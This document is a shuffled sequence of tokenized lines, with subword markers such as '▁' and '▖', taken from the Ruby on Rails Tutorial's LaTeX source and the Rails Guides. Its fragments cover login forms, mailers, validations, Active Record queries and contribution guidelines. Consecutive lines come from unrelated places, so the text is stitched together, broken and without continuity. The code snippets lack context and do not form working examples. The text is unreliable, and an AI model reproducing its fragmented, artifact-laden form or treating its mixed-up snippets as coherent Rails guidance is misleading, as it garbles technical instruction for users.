▁With ▁the ▁proper ▁\ k ode { form \_ for } ▁in ▁hand , ▁it ' s ▁easy ▁to ▁make ▁a ▁login ▁form ▁to ▁match ▁the ▁mockup ▁in ▁Figure ~\ ref { fig : login _ mockup } ▁using ▁the ▁signup ▁form ▁( Listing ~\ ref { code : signup _ form }) ▁as ▁a ▁model , ▁as ▁show n ▁in ▁Listing ~\ ref { code : login _ form } .
▁The ▁method ▁` constantize ` ▁re s ol ve s ▁the ▁constant ▁reference ▁expression ▁in ▁its ▁receiver :
▁< p > T hanks ▁for ▁join ing ▁and ▁have ▁a ▁great ▁day !
▁# ▁=> ▁Tue , ▁09 ▁A ug ▁2011
▁Article ▖ includes (: comments )▖ where (" comments ▖ visible ▁= ▁true ")▖ references (: comments )
▁After ▁restart ing ▁the ▁development ▁server ▁to ▁activate ▁the ▁configuration ▁in ▁Listing ~\ ref { code : development _ email _ settings }, ▁we ▁next ▁need ▁to ▁update ▁the ▁User ▁mailer ▁\ emph { preview ▁file }, ▁which ▁was ▁automatically ▁generated ▁in ▁Section ~\ ref { sec : account _ activation _ mailer }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : generated _ user _ mailer _ preview s } .
▁B ▖ x ▁# ▁=> ▁: b
▁The ▁flash - less ▁profile ▁page ▁after ▁a ▁browser ▁ reload ▖ ~\ href { http :// railstutorial ▖ org / images / figures / signup _ flash _ reload ed _ bootstrap - full ▖ png }{( full ▁size )}
▁ backgroundColor ▁= ▁$ ( this )▖ data (" background - color ")
▁This ▁is ▁the ▁strategy ▁a do p ted ▁by ▁the ▁Rails ▁asset ▁pipeline .
▁The ▁result ing ▁new ▁user ▁page ▁( at ▁the ▁URL ▁ / signup ) ▁appears ▁in ▁Figure ~\ ref { fig : new _ signup _ page } .
▁One ▁of ▁the ▁things ▁that ▁we ▁may ▁as k ▁you ▁to ▁do ▁is ▁to ▁" squash ▁your ▁commit s ", ▁which ╼ will ▁combine ▁all ▁of ▁your ▁commit s ▁into ▁a ▁single ▁commit ▖
▁If ▁we ▁wish ▁for ▁a ▁scope ▁to ▁be ▁applied ▁a cross ▁all ▁queries ▁to ▁the ▁model ▁we ▁can ▁use ▁the ╼` default _ scope ` ▁method ▁within ▁the ▁model ▁itself .
▁The ▁simple st ▁way ▁to ▁use ▁this ▁is ▁to ▁have ▁a ▁single ▁` yield `, ▁into ▁which ▁the ▁entire ▁contents ▁of ▁the ▁view ▁current ly ▁being ▁rendered ▁is ▁inserted :
▁create ▁app / helpers / blorgh / comments _ helper ▖ rb
▁# ▁in ▁your ▁controller
▁In ▁other ▁words , ▁all ▁the ▁pages ▁are ▁identical ▁in ▁structure , ▁including ▁the ▁contents ▁of ▁the ▁title ▁tag , ▁with ▁the ▁so le ▁exception ▁of ▁the ▁material ▁inside ▁the ▁\ k ode { body } ▁tag .
▁However , ▁if ▁your ▁database ▁is ▁not ▁using ▁ UT F -8 ▁internally , ▁it ╼ ▁may ▁not ▁be ▁able ▁to ▁store ▁all ▁characters ▁that ▁your ▁users ▁enter ▖
▁Ruby ▁1▖9 ▁actually ▁guarantee s ▁that ▁hashes ▁keep ▁their ▁elements ▁in ▁the ▁same ▁order ▁entered , ▁but ▁it ▁would ▁be ▁un w is e ▁ever ▁to ▁count ▁on ▁a ▁particular ▁ ordering .
▁* ▁` config ▖ action _ mailer ▖ sendmail _ settings ` ▁allows ▁ detailed ▁configuration ▁for ▁the ▁` sendmail ` ▁ delivery ▁method ▖
▁In ▁Section ~\ ref { sec : logging _ in }, ▁we ▁used ▁the ▁Rails ▁\ k ode { session } ▁method ▁to ▁store ▁the ▁user ' s ▁id , ▁but ▁this ▁information ▁disappear s ▁when ▁the ▁user ▁close s ▁their ▁browser .
▁This ▁avoid s ╼ st or ing ▁an ▁invalid ▁object ▁in ▁the ▁database ▖
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : email _ downcase }
▁This ▁is ▁the ▁sample ▁application ▁for
▁With ▁the ▁addition ▁of ▁the ▁status ▁feed , ▁we ' ve ▁ finished ▁the ▁ core ▁sample ▁application ▁for ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } .
▁When ▁a ▁partial ▁is ▁called ▁with ▁a ▁ pluralize d ▁collection , ▁then ▁the ▁individual ▁instance s ▁of ▁the ▁partial ▁have ▁access ▁to ▁the ▁ member ▁of ▁the ▁collection ▁being ▁rendered ▁via ▁a ▁variable ▁named ▁after ▁the ▁partial ▖
▁To ▁make ▁the ▁effect s ▁of ▁\ k ode { image \_ tag } ▁clear er , ▁let ' s ▁look ▁at ▁the ▁HTML ▁it ▁produce s
▁Mailer s ▁work ▁very ▁similar ly ▁to ▁controllers ▖
▁These ▁default ▁to :
▁We ' ve ▁properly ▁separate d ▁our ▁concern s , ▁making ▁future ╼ change ▁easy ▖
▁This ▁code ▁uses ▁\ k ode { respond \_ to } ▁to ▁take ▁the ▁appropriate ▁action ▁depending ▁on ▁the ▁kind ▁of ▁request .
▁One ▁way ▁to ▁find ▁the ▁proper ▁abstract ion ▁is ▁to ▁consider ▁how ▁we ▁m ight ▁implement ▁the ▁a c t ▁of ▁\ emph { following } ▁in ▁a ▁web ▁application .
▁once ▁the ▁string ▁is ▁ interpolate d .
▁ patch ▁ / users / 17 ?
▁ Template s ▁within ▁a ▁basic ▁Rails ▁application ▁like ▁this ▁are ▁ k e p t ▁in ▁a ▁single ╼ location , ▁but ▁in ▁more ▁complex ▁applications ▁it ▁could ▁be ▁many ▁different ▁paths .
▁If ▁you ▁want ▁to ▁be ▁explicit , ▁you ▁can ▁use ▁the ▁`: template ` ▁option ▁( which ▁was ▁required ▁on ▁Rails ▁ 2▖2 ▁and ▁earlier ) :
▁If ▁you ▁can ' t ▁see ▁the ▁\ k ode { ▖ gitignore } ▁file ▁in ▁your ▁directory , ▁you ▁may ▁need ▁to ▁configure ▁your ▁directory ▁view er ▁to ▁show ▁hidden ▁files .
▁# ▁See ▁" Follow ing ▁users " ▁for ▁the ▁full ▁implementation .
▁#### ▁ MultiJSON ▁remov al
▁There ▁are ▁sever al ▁place s ▁we ▁could ▁put ▁the ▁result ing ▁\ k ode { digest } ▁method , ▁but ▁we ' ll ▁have ▁an ▁opportunit y ▁in ▁Section ~\ ref { sec : remember _ token } ▁to ▁reuse ▁\ k ode { digest } ▁in ▁the ▁User ▁model .
▁ head ▁: bad _ request
▁These ▁results ▁will ▁var y ▁base d ▁on ▁the ▁version ▁of ▁Ruby ▁you ▁are ▁using .
▁That ▁ s a id , ▁the ▁ distinct ion ╼ g en er ally ▁just ▁a ffect s ▁which ▁release ▁your ▁ patch ▁will ▁get ▁in ▁to ; ▁we ▁ lo ve ▁feature ╼ submission s !
▁This ▁is ▁a ▁much ▁less ▁specific ▁ assert ion ▁than ▁\ k ode { assert \_ select } ; ▁in ▁particular , ▁unlike ▁\ k ode { assert \_ select }, ▁using ▁\ k ode { assert \_ match } ▁in ▁this ▁context ▁doesn ' t ▁require ▁us ▁to ▁indicate ▁which ▁HTML ▁tag ▁we ' re ▁look ing ▁for .
▁The ▁\ text tt { bcrypt - ruby } ▁library ▁uses ▁a ▁\ emph { cost ▁ factor } ▁to ▁control ▁how ▁ com put ation ally ▁ cost ly ▁it ▁is ▁to ▁create ▁the ▁secure ▁hash .
▁With out ▁this , ▁there ▁is ▁a ▁possibility ▁that ▁the ▁engine ' s ▁ components ▁could ▁" le a k " ╼ in to ▁the ▁application , ▁caus ing ▁un w an ted ▁di s r up tion , ▁or ▁that ▁important ▁engine ╼ components ▁could ▁be ▁overrid d en ▁by ▁similar ly ▁named ▁things ▁within ▁the ▁application ▖╼
▁You ▁can ▁see ▁more ▁about ▁the ▁events ▁[ in ▁the ▁ jquery - ujs ▁ wiki ]( https :// github ▖ com / rails / jquery - ujs / wiki / ajax ) .
▁* ▁How ▁to ▁create ▁ layouts ▁with ▁multiple ▁content ▁section s .
▁To ▁retrieve ▁records ▁from ▁the ▁database ▁in ▁a ▁specific ▁order , ▁you ▁can ▁use ▁the ▁` order ` ▁method .
▁Here ▁we ' ve ▁ factor ed ▁out ▁the ▁common ▁text ▁for ▁the ▁submit ▁button ▁using ▁the ▁\ k ode { let } ▁method ▁to ▁define ▁a ▁\ k ode { submit } ▁variable .
▁te }╼╼ ▁% ▁subsection ▁rails _ environments ▁( end )╼╼ ▁\ subsection { A ▁Users ▁resource } ▁% ▁( fold )╼ ▁\ label { sec : a _ users _ resource }╼╼
▁By ▁convention , ▁Rails ▁ assumes ▁that ▁the ▁column ▁used ▁to ▁hold ▁the ▁primary ▁key ▁of ▁the ▁association ▁is ▁` id ` ▖
▁When ▁this ▁happens ▁it ▁should ▁be ▁discuss ed ▁over ▁a ▁PR ▁on ▁a ▁case - by - case ▁basis ▁and ▁ never ▁commit ted ▁directly ▁to ▁ doc rails .
▁In ▁the ▁above ▁image , ▁the ▁bottom ▁line ▁has ▁been ▁ truncate d ▖
▁@ assemblies ▁= ▁@ part ▖ assemblies
▁It ' s ▁worth ▁noting ▁that ▁the ▁\ k ode { nil } ▁object ▁is ▁special , ▁in ▁that ▁it ▁is ▁the ▁\ emph { only } ▁Ruby ▁object ▁that ▁is ▁false ▁in ▁a ▁boolean ▁context , ▁a part ▁from ▁\ k ode { false } ▁itself :
▁We ' ll ▁develop ▁the ▁sample ▁app ▁using ▁a ▁combination ▁of ▁\ emph { mockup s }, ▁\ emph { test - driven ▁development } ▁( TDD ), ▁and ▁\ emph { integration ▁tests } .
▁Note ▁that ▁the ▁URL ▁is ▁\ href { http :// localhost :3000/ users /1}{/ users /1 } ; ▁as ▁you ▁m ight ▁suspect , ▁the ▁number ~\ k ode {1} ▁is ▁simply ▁the ▁user ' s ~\ k ode { id } ▁attribute ▁from ▁Figure ~\ ref { fig : demo _ user _ model } .
▁3 89 ▖ 3 23 14 ▖ to _ s (: rounded , ▁ precision : ▁0 ) ▁# ▁=> ▁3 89
▁The ▁Home ▁page ▁with ▁HTML ▁structure ▁removed ▖
▁Consider , ▁for ▁example , ▁the ▁\ text tt { email } ▁attribute ▁created ▁by ▁the ▁migration ▁in ▁Listing ~\ ref { code : users _ migration } .
▁If ▁the ▁CDN ▁has ▁ st a le ▁or ▁ bad ▁content , ▁then ▁it ▁is ╼ h ur ting ▁rather ▁than ▁help ing ▁your ▁application ▖
▁* ▁` config ▖ eager _ load _ paths ` ▁accept s ▁an ▁array ▁of ▁paths ▁from ▁which ▁Rails ▁will ▁ eager ▁load ▁on ▁b oo t ▁if ▁cache ▁classes ▁is ▁enabled ▖
▁WARNING : ▁A u to ma tic ▁deletion ▁of ▁join ▁models ▁is ▁direct , ▁no ▁destroy ▁callbacks ▁are ▁trigger ed .
▁For ▁now , ▁let ' s ▁turn ▁to ▁the ╼ built - in ▁validation ▁helpers ▁that ▁Rails ▁provides ▁by ▁default .
▁You ▁can ▁now ▁wrap ▁the ▁` git ` ▁calls ▁in ▁an ▁` after _ bundle ` ▁block ▖
▁respond _ to ▁: html , ▁: json
▁Signup ▁failure .
▁Ou r ▁original ▁user ▁doesn ' t ▁ s uffer ▁from ▁ l one lines s ▁any ▁more , ▁but ▁now ▁we ▁have ▁the ▁oppos ite ▁problem : ▁our ▁user ▁has ▁\ emph { to o ▁many } ▁ com p an ion s , ▁and ▁they ▁all ▁appear ▁on ▁the ▁same ▁page .
▁It ▁also ▁gives ▁us ▁URL ▁helpers ▁as ▁follows :
▁" production "▖ inquiry ▖ production ?
▁orders ▖ delete ( object , ▁ ▖▖▖)
▁In ▁addition ▁to ▁the ▁` valid ?` ▁and ▁` invalid ?` ▁methods ▁covered ▁earlier , ▁Rails ▁provides ▁a ▁number ▁of ▁methods ▁for ▁working ▁with ▁the ▁` errors ` ▁collection ▁and ▁in q u ir ing ▁about ▁the ▁ validity ▁of ▁objects .
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Name d ▁ Helper ▁|
▁* ▁Re mov es ▁a ▁" _ id " ▁ suffix ▁if ▁present .
▁ } ▖ free z e
▁M any ▁Rails ▁developers ▁use ▁a ▁\ k ode { shared } ▁directory ▁for ▁partials ▁ shared ▁a cross ▁different ▁views .
▁ prev _ month ▁( last _ month )
▁In c or p or ating ▁\ k ode { assert \_ difference } ▁into ▁the ▁file ▁from ▁Listing ~\ ref { code : a _ test _ for _ invalid _ submission } ▁yields ▁the ▁test ▁show n ▁in ▁Listing ~\ ref { code : a _ test _ for _ valid _ submission } .
▁In ▁the ▁context ▁of ▁p ure ▁RSpec , ▁there ▁is ▁a ▁solution , ▁which ▁is ▁to ▁use ▁a ▁\ emph { custom ▁match er }, ▁allow ing ▁us ▁to ▁write ▁the ▁following ▁instead :
▁See ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / v 4▖2▖0 ▖ r c 1 / classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁This ▁helper ▁validates ▁that ▁the ▁specified ▁attributes ▁are ▁ abs ent ▖
▁For ▁example , ▁the ▁ dependencies ▁ mechanism ▁uses ▁them :
▁S ince ▁both ▁pages ▁will ▁be ▁ showing ▁data , ▁we ▁use ▁\ k ode { get } ▁to ▁arrange ▁for ▁the ▁URLs ▁to ▁respond ▁to ▁\ text tt { GET } ▁requests ▁( as ▁required ▁by ▁the ▁REST ▁convention ▁for ▁such ▁pages ), ▁and ▁the ▁\ k ode { member } ▁method ▁means ▁that ▁the ▁routes ▁respond ▁to ▁URLs ▁containing ▁the ▁user ▁id .
▁( Turbolinks ▁will ▁be ▁describe d ▁in ▁more ▁detail ▁in ▁a ▁future ▁d ra f t ▁of ▁this ▁book ▖)
▁This ▁method ▁is ▁not ▁to ler an t ▁to ▁non - ex ist ing ▁date s , ▁if ▁the ▁change ▁is ▁invalid ▁` ArgumentError ` ▁is ▁raised :
▁If ▁the ▁command ▁above ▁returns ▁an ▁error ▁like ▁`` Co ul d ▁not ▁find ▁' railties '' ', ▁it ▁means ▁you ▁don ’ t ▁have ▁the ▁right ▁version ▁of ▁Rails ▁installed , ▁and ▁you ▁should ▁double - check ▁that ▁you ▁followed ▁the ▁command ▁in ▁Listing ~\ ref { code : installing _ rails } ▁exactly ▁as ▁written .
▁Having ▁a ▁good ▁test ▁suite ▁is ▁an ▁in val u able ▁tool ▁in ▁this ▁re g ar d , ▁as ▁it ▁d ra ma tic ally ▁lower s ▁the ▁pro b ability ▁of ▁introduc ing ▁bug s ▁while ▁refactoring .
▁As ▁a ▁result , ▁any ▁ str ate g ies ▁for ▁verify ing ▁requests ▁from ▁non - rails ▁forms ▁that ▁relie d ▁on ▁a ▁static ▁session ▁CSRF ▁token ▁have ▁to ▁take ▁this ▁into ▁account .
▁This ▁update s ▁the ▁database ▁at ▁Heroku ▁with ▁the ▁necessary ▁user ▁and ▁micropost ▁data ▁models .
▁` pluralize ` ▁can ▁also ▁take ▁an ▁optional ▁` count ` ▁parameter ▖
▁We ▁start ▁with ▁the ▁page ▁to ▁show ▁all ▁the ▁users ▁in ▁our ▁application , ▁called ▁\ href { http :// localhost :3000/ users }{\ text tt { index } } ; ▁as ▁you ▁m ight ▁expect , ▁initially ▁there ▁are ▁no ▁users ▁at ▁all ▁( Figure ~\ ref { fig : demo _ blank _ user _ index _ rails _3} ) .
▁See ing ▁exactly ▁how ▁this ▁ play s ▁out ▁is ▁the ▁task ▁for ▁the ▁rest ▁of ▁this ▁tutorial .
▁With ▁that ▁command ▁we ▁to ld ▁Rails ▁that ▁we ▁want ▁a ▁` Article ` ▁model , ▁together ╼ with ▁a ▁ _ title _ ▁attribute ▁of ▁type ▁string , ▁and ▁a ▁ _ text _ ▁attribute ╼ of ▁type ▁text ▖
▁ ╼ ▁$ ▁bundle ▁exec ▁rake ▁db : migrate ▁ VERSION = 0
▁if ▁requirement ▖ multiline ?
▁You ▁can ▁pass ▁either ▁an ▁Active ▁Record ▁object ▁or ▁a ▁collection ▁of ▁objects ▖
▁Re s ul ting ▁in ▁something ▁a ▁little ▁short er , ▁and ▁more ▁ implicit ▁in ▁its ▁behavior ▖
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / instance _ variable s ▖ rb ` .
▁You ▁can ▁use ▁the ▁`: only ` ▁and ▁`: except ` ▁options ▁to ▁fine - t un e ▁this ▁behavior ▖
▁Note ▁in ▁particular ▁that ▁\ k ode { admin } ▁is ▁\ emph { not } ▁in ▁the ▁list ▁of ▁ permitted ▁attributes .
▁class ▁ Book sController ▁< ▁Application Controller
▁Rails ▁ environments
▁config ▖ action _ dispatch ▖ default _ headers ▁= ▁ {
▁On ce ▁users ▁can ▁sign ▁up , ▁we ' ll ▁let ▁them ▁log ▁in ▁and ▁log ▁out ▁as ▁well ▁( Chapter ~\ ref { cha : log _ in _ log _ out }), ▁and ▁in ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users } ▁( Section ~\ ref { sec : requiring _ logged _ in _ users }) ▁we ' ll ▁learn ▁how ▁to ▁protect ▁pages ▁from ▁ im p r o p er ▁access .
▁If ▁you ▁have ▁both ▁` config / database ▖ yml ` ▁and ▁` ENV [' DAT A BASE _ URL ']` ▁set ▁then ▁Rails ▁will ▁merge ▁the ▁configuration ▁together ▖
▁If ▁it ▁fails , ▁we ▁simply ▁f all ▁back ▁on ▁the ▁behavior ▁ developed ▁in ▁Section ~\ ref { sec : unsuccessful _ signup s } .
▁If ▁no ▁ ordering ▁clause ▁is ▁specified ▁in ▁the ▁query , ▁the ▁` reverse _ order ` ▁orders ▁by ▁the ▁primary ▁key ▁in ▁ reverse ▁order .
▁Note ▁in ▁particular ▁the ▁use ▁of ▁the ▁\ k ode { have \_ x path } ▁method , ▁which ▁is ▁an ▁advanced ▁and ▁powerful ▁technique ▁that ▁uses ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / XPath } { XPath } ▁to ▁navigate ▁ XML ▁document s ▁( including ▁HTML 5 ) .
▁With ▁the ▁code ▁in ▁Section ~\ ref { sec : destroy ing _ microposts }, ▁the ▁Micropost ▁model ▁and ▁interface ▁are ▁complete .
▁In ▁the ▁present ▁case , ▁we ▁want ▁the ▁given ▁code ▁\ emph { not } ▁to ▁change ▁the ▁count , ▁which ▁we ▁express ▁using ▁the ▁\ k ode { not \_ to } ▁method .
▁* ▁How ▁to ▁create ▁your ▁own ▁custom ▁validation ▁methods .
▁By ▁convention , ▁Rails ▁ assumes ▁that ▁the ▁column ▁used ▁to ▁hold ▁the ▁foreign ▁key ▁on ▁the ▁other ▁model ▁is ▁the ▁name ▁of ▁this ▁model ▁with ▁the ▁ suffix ▁` _ id ` ▁added ▖
▁* ▁` t ogg le !
▁P lease ▁use ▁A me ri can ▁English ▁ (* color * , ▁* center * , ▁* mod ul ar ize * , ▁etc )▖
▁You ▁can ▁con t in ue ▁after ▁the ▁code ▁example ▁and ▁you ▁can ▁a tt a ch ▁issue ▁number ▖
▁The ▁second ▁syntax ▁replace s ▁the ▁symbol / h ashrocket ▁combination ▁with ▁the ▁name ▁of ▁the ▁key ▁followed ▁by ▁a ▁ col on ▁and ▁a ▁value :
▁We ▁include ▁\ k ode { row } ▁and ▁\ k ode { col - md - 4 } ▁classes , ▁which ▁are ▁both ▁part ▁of ▁Bootstrap .
▁ body : ▁email _ body ,
▁No ▁tests .
▁ ╼ ▁* = ▁require _ tree ▁ .
▁The ▁model ▁file , ▁` app / models / article ▖ rb ` ▁is ▁about ▁as ▁simple ▁as ▁it ▁can ▁get :
▁ Update d ▁tests ▁for ▁the ▁Home ▁page ' s ▁title .
▁This ▁section ▁ explain s ▁how ▁to ▁add ▁and / or ▁override ▁engine ▁ MVC ▁functionality ▁in ▁the ╼ main ▁Rails ▁application .
▁def ▁d er ive _ class _ name
▁The ▁\ href { http :// r ailscasts ▖ com / episodes / 87 - generating - rs s - feed s } { RailsCast ▁on ▁ generating ▁ RSS ▁feed s } ▁will ▁help ▁get ▁you ▁started .
▁ sy s 	 0 m 1 ▖ 06 8 s
▁# ▁config ▖ action _ mailer ▖ sendmail _ settings ▁= ▁ {
▁It ' s ▁important ▁to ▁understand ▁that ▁ TDD ▁is ▁not ▁always ▁the ▁right ▁tool ▁for ▁the ▁job : ▁there ' s ▁no ▁reason ▁to ▁do g ma tic ally ▁in s ist ▁that ▁tests ▁always ▁should ▁be ▁written ▁first , ▁that ▁they ▁should ▁cover ▁every ▁single ▁feature , ▁or ▁that ▁there ▁should ▁necessar ily ▁be ▁any ▁tests ▁at ▁all .
▁The ▁Microposts ▁controller ▁\ k ode { destroy } ▁action .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / class / attribute ▖ rb `
▁# ▁=> ▁ ActiveModel :: Strict V al id ation F a ile d : ▁Name ▁can ' t ▁be ▁blank
▁#### # ▁` collection ▖ create ( attributes ▁= ▁{}) `
▁A ▁signed - in ▁user ▁with ▁new ▁links ▁and ▁a ▁ drop d own ▁ menu ▖ ~\ href { http :// railstutorial ▖ org / images / figures / profile _ with _ signout _ link _ bootstrap - full ▖ png }{( full ▁size )}
▁In ▁Read er , ▁you ▁can ▁right - click ▁on ▁the ▁document ▁and ▁select ▁`` Previous ▁View '' ▁to ▁go ▁back .
▁as ▁show n ▁in ▁Listing ~\ ref { code : remember _ me _ css } .
▁TIP : ▁You ▁don ' t ▁need ▁to ▁call ▁` to _ json ` ▁on ▁the ▁object ▁that ▁you ▁want ▁to ▁render ▖
▁token
▁M a k ing ▁the ▁\ k ode { content } ▁attribute ▁( and ▁\ emph { only } ▁the ▁\ k ode { content } ▁attribute ) ▁ accessible .
▁No ▁override s .
▁( If ▁you ' re ▁working ▁on ▁your ▁local ▁machine ▁instead ▁of ▁the ▁cloud ▁IDE , ▁you ▁can ▁also ▁use ▁\ k ode { heroku ▁open } ▖)
▁The ▁old ▁defaults ▁in ▁the ▁test ╼ environment ▁are : ▁` config ▖ assets ▖ compile ▁= ▁true `, ▁` config ▖ assets ▖ compress ▁= ▁false `, ╼` config ▖ assets ▖ debug ▁= ▁false ` ▁and ▁` config ▖ assets ▖ digest ▁= ▁false ` .
▁On ▁most ▁systems , ▁you ▁can ▁also ▁use ▁ Ctrl - D ▁for ▁the ▁same ▁purpose ▖)
▁We ▁end ▁our ▁discussion ▁of ▁the ▁ demo ▁application ▁with ▁a ▁brief ▁ description ▁of ▁the ▁controller ▁and ▁model ▁class ▁ hierarchies ▁in ▁Rails .
▁In ▁Rails ▁5 , ▁the ▁default ▁log ▁level ▁for ▁the ▁production ▁environment ▁will ▁be ▁changed ╼ to ▁`: debug ` ▁( from ▁`: info ` )▖
▁A long ▁the ▁way , ▁we ' ll ▁build ▁on ▁our ▁work ▁in ▁Section ~\ ref { sec : layout _ link _ tests } ▁to ▁write ▁succinct ▁and ▁express ive ▁integration ▁tests .
▁in ▁Listing ~\ ref { code : home _ view _ erb _ title } .
▁Or , ▁in ▁English : ▁" return ▁all ▁articles ▁that ▁have ▁a ▁comment ▁made ▁by ▁a ▁ guest ▖ "
▁In ▁P re view , ▁use ▁the ▁ Go ▁ menu : ▁\ text tt { Go ▁> ▁ Back } .
▁The ▁methods ▁` silence _ warning s ` ▁and ▁` en able _ warning s ` ▁change ▁the ▁value ▁of ▁` $ V ERB OS E ` ▁according ly ▁for ▁the ▁d ur ation ▁of ▁their ▁block , ▁and ▁reset ▁it ▁after ward s :
▁Using ▁an ▁RSpec ▁ shared ▁example ▁to ▁eliminate ▁test ▁duplication .
▁T a g s ▁that ▁follow ▁this ▁form ▁are ▁known ▁as ▁\ emph { self - closing } ▁tags .
▁Rails ▁on ▁Rack
▁The ▁first ▁thing ▁that ▁the ▁scaffold ▁generator ▁does ▁is ▁invoke ▁the ▁` active _ record `╼ generator , ▁which ▁generates ▁a ▁migration ▁and ▁a ▁model ▁for ▁the ▁resource ▖
▁In ▁this ▁case ▁we ▁are ▁setting ▁the ▁`: from ` ▁header ▁to ▁a ▁value ▁for ▁all ╼ messages ▁in ▁this ▁class ▖
▁ } ▁%></ td >
▁This ▁does ▁not ▁destroy ▁the ▁ associated ▁objects .
▁We ▁then ▁cover ▁the ▁two ▁cases ▁of ▁password ▁match ▁and ▁ mis match :
▁In ▁other ▁words , ▁if ▁a ▁non - logged - in ▁user ▁ tries ▁to ▁visit ▁the ▁edit ▁page , ▁after ▁logging ▁in ▁the ▁user ▁will ▁be ▁ redirected ▁to ▁ / users /1 ▁instead ▁of ▁ / users /1/ edit .
▁This ▁is ▁how ▁you ▁run ▁the ▁Active ▁Record ▁test ▁suite ▁only ▁for ▁SQLite 3 :
▁#### # ▁`: inverse _ of `
▁An ▁integration ▁test ▁for ▁the ▁micropost ▁interface ▖
▁# ▁arguments : ▁' - i ▁- t '
▁A ▁console ▁will ▁also ▁be ▁provided ▁on ▁any ▁error ▁page ▁you ▁view ▁in ▁your ▁development ▁environment .
▁### ▁C s r f Helper
▁at ▁least ▁one ▁letter
▁You ▁may ▁recall ▁from ▁Section ~\ ref { sec : a _ user _ class } ▁that ▁we ▁have ▁already ▁ en counter ed , ▁via ▁a ▁custom - built ▁\ k ode { User } ▁class , ▁user ▁objects ▁with ▁\ k ode { name } ▁and ▁\ k ode { email } ▁attributes .
▁invoke ▁test _ unit
▁The ▁relationships ▁between ▁these ▁classes ▁is ▁illustrate d ▁in ▁Figure ~\ ref { fig : demo _ controller _ inheritance } .
▁Add ▁an ▁email ▁address ▁ ve r if ic ation ▁step ▁to ▁confirm ▁a ▁user ' s ▁signup .
▁S a fe ▁arguments ▁are ▁directly ▁ append ed :
▁* ▁` render ▁: html ` ▁will ▁set ▁the ▁content ▁type ▁to ▁` text / html `
▁#### ▁options _ for _ select
▁Because ▁you ▁want ▁to ▁create ▁a ▁new ▁HTML ▁form , ▁you ▁will ▁be ▁using ▁the ▁` ERB `╼ language ▖
▁* ▁` having `
▁< option ▁value =" 3 " ▁select ed =" select ed "> C h in a </ option >
▁To ▁activate ▁the ▁root ▁route , ▁un comment ▁this ▁line ▁by ▁remov ing ▁the ▁hash ▁character ▁and ▁then ▁replace ▁it ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : hello _ root _ route }, ▁which ▁tell s ▁Rails ▁to ▁send ▁the ▁root ▁route ▁to ▁the ▁\ k ode { hello } ▁action ▁in ▁the ▁Application ▁controller .
▁As ▁you ▁m ight ▁guess ▁from ▁the ▁working ▁page , ▁at ▁this ▁point ▁the ▁corresponding ▁test ▁should ▁also ▁pass :
▁ Password ▁re m in d ers
▁First , ▁run ▁these ▁two ▁commands :
▁As ▁with ▁models ▁and ▁controllers , ▁we ▁can ▁generate ▁a ▁mailer ▁using ▁\ k ode { rails ▁generate } :
▁For ▁example , ▁you ▁can ▁return ▁only ▁an ▁error ▁header :
▁For ▁example , ▁` " SSL Error "▖ underscore ▖ camelize ` ▁gives ▁back ▁` " S s l Error " ` .
▁{" development "=>{" adapt er "=>" sqlite 3 ", ▁" database "=>" NOT _ my _ database "} }
▁If ▁you ▁must ▁support ▁non - JavaScript - en able d ▁browsers ▁you ▁can ▁fake ▁a ▁\ text tt { DELETE } ▁request ▁using ▁a ▁form ▁and ▁a ▁\ text tt { POST } ▁request , ▁which ▁works ▁even ▁without ▁JavaScript
▁render ▁status : ▁: for b id d en
▁config ▖ assets ▖ cache _ store ▁= ▁: memory _ store , ▁ { ▁size : ▁ 32 ▖ me g abytes ▁ }
▁<%= ▁form _ for ▁[ ▁: update _ name , ▁@ user ▁ ] , ▁method : ▁: put ▁do ▁| f | ▁%>
▁In ▁this ▁case , ▁Rails ▁will ▁use ▁the ▁customer ▁or ▁ employee ▁partials ▁as ▁appropriate ▁for ▁each ▁ member ▁of ▁the ▁collection .
▁This ▁is ▁the ▁same ▁ authorization ▁model ▁used ▁by ▁Twitter .
▁You ▁can ▁also ▁use ▁the ▁ ternary ▁operator ▁to ▁replace ▁assignment :
▁The ▁\ k ode { where } ▁method ▁can ▁be ▁used ▁to ▁perform ▁Active ▁Record ▁select ion s .
▁% w ( 1 ▁2 ▁3 ▁4 ▁5 ▁6 ▁7 )▖ in _ groups (3) ▁ { | group | ▁p ▁group }
▁* ▁` config ▖ action _ controller ▖ perform _ caching ` ▁configure s ▁whether ▁the ▁application ▁should ▁perform ▁ caching ▁or ▁not ▖
▁ ╼ ▁Get ▁help ▁on ▁the ▁Ruby ▁on ▁Rails ▁Tutorial ▁at ▁the
▁The ▁` exists ?` ▁method ▁also ▁take s ▁multiple ▁values , ▁but ▁the ▁catch ▁is ▁that ▁it ▁will ▁return ▁` true ` ▁if ▁any ╼ one ▁of ▁those ▁records ▁exists .
▁* ▁` ActionDispatch :: Session :: CookieStore ` ▁is ▁responsib le ▁for ▁storing ▁the ▁session ▁in ▁cookies ▖
▁#### # ▁`: validate `
▁The ▁result ▁appears ▁as ▁in ▁Listing ~\ ref { code : relationships _ controller _ ajax } .
▁For ▁instance ▁` ActionController :: Url Re writer ` ▁defines
▁root ▁to : ▁" admin # index "
▁### ▁Running ▁an ▁Application ▁A g a in st ▁Your ▁ Local ▁B r an ch
▁This ▁method ▁may ▁be ▁useful ▁for ▁example ▁to ▁build ▁special ize d ▁ conversions ▖
▁Rails ▁also ▁provides ▁sever al ▁ways ▁to ▁more ▁precise ly ▁assign ▁specific ▁ layouts ▁to ▁individual ▁controllers ▁and ▁actions .
▁Help ing ▁to ▁Re s ol ve ▁E x ist ing ▁ Issue s
▁=> ▁" 42, ▁ 8, ▁17 , ▁7 , ▁ foo , ▁bar "
▁In ▁Chapter ~\ ref { cha : sign _ in _ sign _ out }, ▁we ' ll ▁use ▁the ▁\ k ode { authenticate } ▁method ▁to ▁sign ▁registered ▁users ▁into ▁our ▁site .
